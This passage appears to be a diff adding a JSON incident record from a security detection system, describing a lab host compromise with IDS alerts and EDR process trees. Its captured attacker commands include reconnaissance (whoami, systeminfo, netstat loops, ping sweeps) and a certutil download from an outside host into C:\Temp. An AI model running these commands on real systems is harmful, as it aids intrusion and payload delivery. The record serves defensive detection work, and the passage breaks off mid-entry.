@@ -1,0 +1,2147 @@
+{
+  "unified_event_id": "INC-20260912-000004",
+  "event_snapshot": {
+    "event_type": "LATERAL_MOVEMENT_REASONING",
+    "time_range": [
+      "2026-09-14T16:16:16.377000Z",
+      "2026-09-21T22:55:37.217000Z"
+    ],
+    "judgement_target": {
+      "claim_family": "incident_declared_threat",
+      "claim_type": "LATERAL_MOVEMENT_REASONING",
+      "target_source": "incident.incidentType",
+      "anchor_rule": {
+        "id": "900010",
+        "name": "A2-主机沦陷-单主机高置信",
+        "description": "沦陷(X) ⇒ emit 主机沦陷(X)。盲区主机被真沦陷战术打穿即成案, 不依赖横移连接。"
+      }
+    },
+    "entities": [
+      {
+        "entity_ref": "E1",
+        "entity_type": "asset",
+        "role": "anchor",
+        "asset_id": "3617504",
+        "ip": "172.16.2.99",
+        "hostname": "web PC",
+        "entity_display": "web PC（172.16.2.99，资产ID 3617504）"
+      },
+      {
+        "entity_ref": "E2",
+        "entity_type": "asset",
+        "role": "anchor",
+        "asset_id": "3617506",
+        "ip": "172.16.2.109",
+        "hostname": "DESKTOP-U8GL6JB",
+        "entity_display": "DESKTOP-U8GL6JB（172.16.2.109，资产ID 3617506）"
+      },
+      {
+        "entity_ref": "E3",
+        "entity_type": "asset",
+        "role": "anchor",
+        "asset_id": "3617507",
+        "ip": "172.16.2.110",
+        "hostname": "DESKTOP-C82PUMN",
+        "entity_display": "DESKTOP-C82PUMN（172.16.2.110，资产ID 3617507）"
+      },
+      {
+        "entity_ref": "E4",
+        "entity_type": "ip",
+        "role": "anchor",
+        "ip": "10.10.10.133",
+        "entity_display": "10.10.10.133"
+      },
+      {
+        "entity_ref": "E5",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E1",
+        "related_to": [
+          "E1"
+        ],
+        "name": "wish\\\\admin",
+        "entity_display": "wish\\\\admin"
+      },
+      {
+        "entity_ref": "E6",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E2",
+        "related_to": [
+          "E2"
+        ],
+        "name": "DESKTOP-U8GL6JB\\\\wish-win10",
+        "entity_display": "DESKTOP-U8GL6JB\\\\wish-win10"
+      },
+      {
+        "entity_ref": "E7",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E2",
+        "related_to": [
+          "E2"
+        ],
+        "name": "NT AUTHORITY\\\\NETWORK SERVICE",
+        "entity_display": "NT AUTHORITY\\\\NETWORK SERVICE"
+      },
+      {
+        "entity_ref": "E8",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E2",
+        "related_to": [
+          "E2"
+        ],
+        "name": "NT AUTHORITY\\\\SYSTEM",
+        "entity_display": "NT AUTHORITY\\\\SYSTEM"
+      },
+      {
+        "entity_ref": "E9",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E3",
+        "related_to": [
+          "E3"
+        ],
+        "name": "DESKTOP-C82PUMN\\\\wish-wish10-pc",
+        "entity_display": "DESKTOP-C82PUMN\\\\wish-wish10-pc"
+      },
+      {
+        "entity_ref": "E10",
+        "entity_type": "user",
+        "role": "related",
+        "bound_asset_ref": "E3",
+        "related_to": [
+          "E3"
+        ],
+        "name": "NT AUTHORITY\\\\SYSTEM",
+        "entity_display": "NT AUTHORITY\\\\SYSTEM"
+      }
+    ]
+  },
+  "enriched_context": {
+    "graph": {
+      "related_hosts": [
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617344,
+          "hostname": "攻击肉机",
+          "ip": "172.16.1.155",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617345,
+          "hostname": "防火墙虚拟机",
+          "ip": "172.16.1.1",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617351,
+          "hostname": "WAF-Server-虚拟机",
+          "ip": "172.16.1.100",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617352,
+          "hostname": "EDR Agent",
+          "ip": "172.16.2.102",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617506,
+          "hostname": "DESKTOP-U8GL6JB",
+          "ip": "172.16.2.109",
+          "direction": "in"
+        },
+        {
+          "entity_ref": "E1",
+          "asset_id": 3617426,
+          "hostname": "部署验证环境服务器",
+          "ip": "172.16.138.226",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": 3617344,
+          "hostname": "攻击肉机",
+          "ip": "172.16.1.155",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": 3617345,
+          "hostname": "防火墙虚拟机",
+          "ip": "172.16.1.1",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": 3617504,
+          "hostname": "web PC",
+          "ip": "172.16.2.99",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": 3617426,
+          "hostname": "部署验证环境服务器",
+          "ip": "172.16.138.226",
+          "direction": "out"
+        },
+        {
+          "entity_ref": "E3",
+          "asset_id": 3617345,
+          "hostname": "防火墙虚拟机",
+          "ip": "172.16.1.1",
+          "direction": "out"
+        }
+      ],
+      "related_users": [
+        {
+          "entity_ref": "E1",
+          "name": "Administrator",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E1",
+          "name": "Guest",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E1",
+          "name": "admin",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E1",
+          "name": "SYSTEM",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E1",
+          "name": "NETWORK SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E1",
+          "name": "LOCAL SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "Administrator",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "WDAGUtilityAccount",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "Guest",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "wish-win10",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "DefaultAccount",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "SYSTEM",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "NETWORK SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E2",
+          "name": "LOCAL SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "Administrator",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "WDAGUtilityAccount",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "wish-wish10-pc",
+          "privilege": "admin",
+          "role": "admin_of"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "Guest",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "DefaultAccount",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "SYSTEM",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "defaultuser0",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "NETWORK SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        },
+        {
+          "entity_ref": "E3",
+          "name": "LOCAL SERVICE",
+          "privilege": "normal",
+          "role": "local"
+        }
+      ],
+      "connection_history": [],
+      "firewall_sessions": [
+        {
+          "source_ip": "172.16.1.100",
+          "destination_ip": "172.16.2.99",
+          "pass_count": 32230,
+          "block_count": 0,
+          "destination_port": 8080,
+          "protocol": "tcp",
+          "action": "pass",
+          "first_seen": "2026-09-14T14:35:41Z",
+          "last_seen": "2026-09-29T07:09:08Z",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ]
+        }
+      ],
+      "ids_probe_alerts": [
+        {
+          "source": "Wazuh",
+          "event_type": "OTHER",
+          "source_ip": "172.16.2.110",
+          "count": 17,
+          "first_seen": "2026-09-14T20:15:51.631000Z",
+          "last_seen": "2026-09-15T00:59:15.705000Z",
+          "entity_refs": [
+            "E10",
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "Wazuh",
+          "event_type": "SUSPICIOUS_FILE_OP",
+          "source_ip": "172.16.2.110",
+          "count": 26,
+          "first_seen": "2026-09-14T23:53:55.918000Z",
+          "last_seen": "2026-09-15T00:59:23.700000Z",
+          "entity_refs": [
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "SUSPICIOUS_RECON_CMD",
+          "source_ip": "172.16.2.110",
+          "count": 3,
+          "first_seen": "2026-09-14T23:54:01.589573Z",
+          "last_seen": "2026-09-15T00:56:48.432636Z",
+          "entity_refs": [
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "LM_POST_EXPLOIT",
+          "source_ip": "172.16.2.110",
+          "count": 2,
+          "first_seen": "2026-09-14T23:54:03.804822Z",
+          "last_seen": "2026-09-15T00:45:32.662959Z",
+          "entity_refs": [
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+          "source_ip": "172.16.2.110",
+          "count": 3,
+          "first_seen": "2026-09-15T00:07:00.040815Z",
+          "last_seen": "2026-09-15T00:56:44.235585Z",
+          "entity_refs": [
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "MALWARE_EXECUTION",
+          "source_ip": "172.16.2.110",
+          "count": 1,
+          "first_seen": "2026-09-15T00:46:11.993097Z",
+          "last_seen": "2026-09-15T00:46:11.993097Z",
+          "entity_refs": [
+            "E3",
+            "E9"
+          ]
+        },
+        {
+          "source": "Wazuh",
+          "event_type": "SUSPICIOUS_FILE_OP",
+          "source_ip": "172.16.2.109",
+          "count": 13,
+          "first_seen": "2026-09-15T07:16:01.878000Z",
+          "last_seen": "2026-09-18T08:48:40.057000Z",
+          "entity_refs": [
+            "E2",
+            "E6",
+            "E7",
+            "E8"
+          ]
+        },
+        {
+          "source": "Wazuh",
+          "event_type": "OTHER",
+          "source_ip": "172.16.2.109",
+          "count": 11,
+          "first_seen": "2026-09-15T22:55:36.929000Z",
+          "last_seen": "2026-09-17T22:55:51.871000Z",
+          "entity_refs": [
+            "E2",
+            "E8"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "SUSPICIOUS_RECON_CMD",
+          "source_ip": "172.16.2.109",
+          "count": 4,
+          "first_seen": "2026-09-17T10:55:37.814066Z",
+          "last_seen": "2026-09-17T22:55:53.068034Z",
+          "entity_refs": [
+            "E2",
+            "E8"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+          "source_ip": "172.16.2.109",
+          "count": 2,
+          "first_seen": "2026-09-17T10:55:53.687976Z",
+          "last_seen": "2026-09-17T22:55:53.454372Z",
+          "entity_refs": [
+            "E2",
+            "E8"
+          ]
+        },
+        {
+          "source": "Wazuh",
+          "event_type": "CONFIG_VIOLATION",
+          "source_ip": "172.16.2.109",
+          "count": 1,
+          "first_seen": "2026-09-17T22:55:01.928000Z",
+          "last_seen": "2026-09-17T22:55:01.928000Z",
+          "entity_refs": [
+            "E2"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "SUSPICIOUS_RECON_CMD",
+          "source_ip": "172.16.2.99",
+          "count": 2,
+          "first_seen": "2026-09-18T04:18:22.191790Z",
+          "last_seen": "2026-09-18T04:31:47.848770Z",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "LM_POST_EXPLOIT",
+          "source_ip": "172.16.2.99",
+          "count": 1,
+          "first_seen": "2026-09-18T04:18:35.077142Z",
+          "last_seen": "2026-09-18T04:18:35.077142Z",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "HIGH_FREQ_PROCESS_SPAWN",
+          "source_ip": "172.16.2.99",
+          "count": 2,
+          "first_seen": "2026-09-18T04:25:11.250314Z",
+          "last_seen": "2026-09-18T04:29:06.587342Z",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ]
+        },
+        {
+          "source": "detect",
+          "event_type": "C2_BEACON",
+          "source_ip": "172.16.2.99",
+          "count": 2,
+          "first_seen": "2026-09-18T04:26:31.075187Z",
+          "last_seen": "2026-09-18T04:27:05.036387Z",
+          "entity_refs": [
+            "E1",
+            "E5"
+          ]
+        }
+      ],
+      "trust_info": null,
+      "path_hints": [
+        {
+          "src_ip": "172.16.1.100",
+          "dst_ref": "E1",
+          "dst_asset_id": "3617504",
+          "dst_host": "web PC",
+          "dst_ip": "172.16.2.99",
+          "protocols": [
+            "tcp"
+          ],
+          "dst_ports": [
+            8080
+          ],
+          "count": 30,
+          "time_range": [
+            "2026-09-15T06:48:00.562473Z",
+            "2026-09-18T07:35:01.491088Z"
+          ],
+          "basis": "event"
+        }
+      ],
+      "asset_group": [
+        {
+          "entity_ref": "E1",
+          "asset_id": "3617504"
+        },
+        {
+          "entity_ref": "E2",
+          "asset_id": "3617506"
+        },
+        {
+          "entity_ref": "E3",
+          "asset_id": "3617507"
+        }
+      ],
+      "cross_device_corroboration": [],
+      "topology_summary": [
+        {
+          "entity_ref": "E1",
+          "asset_in_graph": true,
+          "neighbor_count": 6,
+          "neighbors_truncated": false,
+          "graph_stale": false,
+          "reachable_asset_count": 27,
+          "reachable_truncated": false
+        },
+        {
+          "entity_ref": "E2",
+          "asset_in_graph": true,
+          "neighbor_count": 4,
+          "neighbors_truncated": false,
+          "graph_stale": false,
+          "reachable_asset_count": 26,
+          "reachable_truncated": false
+        },
+        {
+          "entity_ref": "E3",
+          "asset_in_graph": true,
+          "neighbor_count": 1,
+          "neighbors_truncated": false,
+          "graph_stale": false,
+          "reachable_asset_count": 26,
+          "reachable_truncated": false
+        }
+      ],
+      "login_sequence": [
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.102",
+          "destination_host": "WEB",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1788801363668,
+          "last_seen_epoch_ms": 1789216217651,
+          "occurrence_count": 146
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.103",
+          "destination_host": "pc1",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789003916597,
+          "last_seen_epoch_ms": 1789013134511,
+          "occurrence_count": 4
+        },
+        {
+          "entity_ref": "E1",
+          "account": "Administrator",
+          "source_ip": "::1",
+          "destination_ip": "172.16.2.103",
+          "destination_host": "pc1",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789006038503,
+          "last_seen_epoch_ms": 1789011308509,
+          "occurrence_count": 3
+        },
+        {
+          "entity_ref": "E2",
+          "account": "Administrator",
+          "source_ip": "::1",
+          "destination_ip": "172.16.2.103",
+          "destination_host": "pc1",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789006038503,
+          "last_seen_epoch_ms": 1789011308509,
+          "occurrence_count": 3
+        },
+        {
+          "entity_ref": "E3",
+          "account": "Administrator",
+          "source_ip": "::1",
+          "destination_ip": "172.16.2.103",
+          "destination_host": "pc1",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789006038503,
+          "last_seen_epoch_ms": 1789011308509,
+          "occurrence_count": 3
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.100",
+          "destination_host": "wish",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789008436049,
+          "last_seen_epoch_ms": 1789025101185,
+          "occurrence_count": 30
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": null,
+          "destination_host": null,
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789028625378,
+          "last_seen_epoch_ms": 1789215565740,
+          "occurrence_count": 410
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.99",
+          "destination_host": "wish",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789028723101,
+          "last_seen_epoch_ms": 1789215720020,
+          "occurrence_count": 68
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.109",
+          "destination_host": "win10-new",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789117873045,
+          "last_seen_epoch_ms": 1789118509851,
+          "occurrence_count": 13
+        },
+        {
+          "entity_ref": "E1",
+          "account": "SYSTEM",
+          "source_ip": null,
+          "destination_ip": "172.16.2.109",
+          "destination_host": "DESKTOP-U8GL6JB",
+          "destination_port": null,
+          "first_seen_epoch_ms": 1789118782667,
+          "last_seen_epoch_ms": 1789215565678,
+          "occurrence_count": 329
+        }
+      ]
+    },
+    "edr_detail": {
+      "entities": [
+        {
+          "entity_ref": "E1",
+          "entity_display": "web PC（172.16.2.99，资产ID 3617504）",
+          "activity_segments": [
+            {
+              "segment_id": "E1-SEG-001",
+              "scope": "anchor_entity",
+              "time_range": [
+                "2026-09-15T06:48:00.562473Z",
+                "2026-09-18T07:35:01.491088Z"
+              ],
+              "default_user": "wish\\\\admin",
+              "source_types": [
+                "Sysmon",
+                "detect"
+              ],
+              "processes": [
+                {
+                  "ref": "P001",
+                  "image": "C:\\\\Program Files (x86)\\\\Common Files\\\\Oracle\\\\Java\\\\javapath_target_2661689\\\\java.exe",
+                  "action": "Open",
+                  "count": 30,
+                  "time_range": [
+                    "2026-09-15T06:48:00.562473Z",
+                    "2026-09-18T07:35:01.491088Z"
+                  ],
+                  "cmdline": "java  -jar Desktop\\\\JavaSecLab.jar"
+                },
+                {
+                  "ref": "P002",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c whoami",
+                  "observed_at": "2026-09-18T04:18:22.191790Z",
+                  "parent_ref": "P001"
+                },
+                {
+                  "ref": "P003",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c \\\"ver &amp; echo --- &amp; systeminfo | findstr /B /C:\\\"OS Name\\\" /C:\\\"OS Version\\\" /C:\\\"OS Architecture\\\" /C:\\\"Host Name\\\" 2&gt;nul &amp; echo ---NET--- &amp; ipconfig /all 2&gt;nul | findstr /I /C:\\\"IPv4\\\" /C:\\\"Gateway\\\" /C:\\\"Adapter\\\" /C:\\\"Description\\\"\\\""
+                },
+                {
+                  "ref": "P004",
+                  "image": "C:\\\\Windows\\\\System32\\\\ipconfig.exe",
+                  "cmdline": "ipconfig  /all",
+                  "observed_at": "2026-09-18T04:18:35.077142Z",
+                  "parent_ref": "P003"
+                },
+                {
+                  "ref": "P005",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c \\\"for /l %i in (1,1,254) do @netstat -an | findstr \\\":%i.*LISTENING\\\" &gt;nul 2&gt;&amp;1 &amp; echo test\\\""
+                },
+                {
+                  "ref": "P006",
+                  "image": "C:\\\\Windows\\\\System32\\\\findstr.exe",
+                  "cmdline": "findstr  \\\":11.*LISTENING\\\"",
+                  "observed_at": "2026-09-18T04:25:11.250314Z",
+                  "parent_ref": "P005"
+                },
+                {
+                  "ref": "P007",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c \\\"certutil -urlcache -split -f http://10.10.10.10:80/ C:\\\\Temp\\\\_c1.txt 2&gt;&amp;1 | findstr /i \\\"失败 成功\\\"\\\""
+                },
+                {
+                  "ref": "P008",
+                  "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
+                  "cmdline": "certutil  -urlcache -split -f http://10.10.10.10:80/ C:\\\\Temp\\\\_c1.txt",
+                  "observed_at": "2026-09-18T04:26:31.075187Z",
+                  "parent_ref": "P007"
+                },
+                {
+                  "ref": "P009",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c \\\"certutil -urlcache -split -f http://10.10.10.10:80/ C:\\\\Temp\\\\_c1.txt &gt; C:\\\\Temp\\\\_c1log.txt 2&gt;&amp;1\\\""
+                },
+                {
+                  "ref": "P010",
+                  "image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
+                  "cmdline": "certutil  -urlcache -split -f http://10.10.10.10:80/ C:\\\\Temp\\\\_c1.txt",
+                  "observed_at": "2026-09-18T04:27:05.036387Z",
+                  "parent_ref": "P009"
+                },
+                {
+                  "ref": "P011",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "C:\\\\Windows\\\\system32\\\\cmd.exe  /K C:\\\\Temp\\\\arp_scan.bat"
+                },
+                {
+                  "ref": "P012",
+                  "image": "C:\\\\Windows\\\\System32\\\\PING.EXE",
+                  "cmdline": "ping  -n 1 -w 200 10.10.10.20",
+                  "observed_at": "2026-09-18T04:29:06.587342Z",
+                  "parent_ref": "P011"
+                },
+                {
+                  "ref": "P013",
+                  "image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
+                  "cmdline": "cmd.exe /c \\\"tasklist /fi \\\"imagename eq ping.exe\\\"\\\"",
+                  "observed_at": "2026-09-18T04:31:47.848770Z",
+                  "parent_ref": "P001"
+                }
+              ],
+              "network_details": [
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 60618,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T06:48:00.562473Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 36246,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T06:49:00.757856Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 59278,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:16:02.209125Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 45018,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:17:00.287925Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 35168,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:18:00.223125Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 59026,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:19:02.279925Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 51782,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:20:04.212806Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 40984,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:21:02.237410Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 55132,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-15T21:22:02.098844Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 59792,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-16T11:55:59.933148Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 60310,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-17T02:29:00.765969Z"
+                },
+                {
+                  "process_ref": "P002",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T04:18:22.191790Z",
+                    "2026-09-18T04:31:47.848770Z"
+                  ]
+                },
+                {
+                  "process_ref": "P004",
+                  "observed_at": "2026-09-18T04:18:35.077142Z"
+                },
+                {
+                  "process_ref": "P006",
+                  "observed_at": "2026-09-18T04:25:11.250314Z"
+                },
+                {
+                  "process_ref": "P008",
+                  "count": 2,
+                  "time_range": [
+                    "2026-09-18T04:26:31.075187Z",
+                    "2026-09-18T04:27:05.036387Z"
+                  ]
+                },
+                {
+                  "process_ref": "P012",
+                  "observed_at": "2026-09-18T04:29:06.587342Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 34662,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:17:01.530446Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 36388,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:18:01.477850Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 54330,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:19:01.687511Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 34318,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:20:01.631932Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 37464,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:20:59.719667Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 43554,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:21:59.664088Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 42300,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:22:59.603619Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 57004,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:24:03.519968Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 55328,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:25:01.600257Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 46510,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:26:01.536994Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 49496,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:27:01.473731Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 53228,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:28:01.675675Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 46684,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:29:01.612411Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 48702,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:30:01.548261Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 55096,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:31:01.749046Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 59872,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
+                  "process_ref": "P001",
+                  "observed_at": "2026-09-18T07:32:01.684631Z"
+                },
+                {
+                  "source_ip": "172.16.1.100",
+                  "source_port": 51200,
+                  "destination_ip": "172.16.2.99",
+                  "destination_port": 8080,
+                  "protocol": "tcp",
